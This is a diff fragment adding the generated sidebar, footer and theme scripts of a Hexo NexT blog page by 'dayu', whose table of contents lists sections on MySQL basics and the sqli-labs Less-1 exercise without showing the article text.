+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">环境搭建：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0mysql"><span class="nav-number">2.</span> <span class="nav-text">学习mysql</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%93%8D%E4%BD%9Cmysql"><span class="nav-number">2.1.</span> <span class="nav-text">命令行操作mysql</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mysql%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.2.</span> <span class="nav-text">mysql数据类型</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqli-labs"><span class="nav-number">3.</span> <span class="nav-text">sqli-labs</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Less-1"><span class="nav-number">3.1.</span> <span class="nav-text">Less-1</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="dayu"
+      src="https://raw.githubusercontent.com/icnshark/icnshark.github.io.imgs/main/avatar.jpg">
+  <p class="site-author-name" itemprop="name">dayu</p>
+  <div class="site-description" itemprop="description">北冥有魚 其名為鯤<br>化而為鳥 其名為鵬</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/icnshark" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;icnshark" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:icnshark@gmail.com" title="E-Mail → mailto:icnshark@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">dayu</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
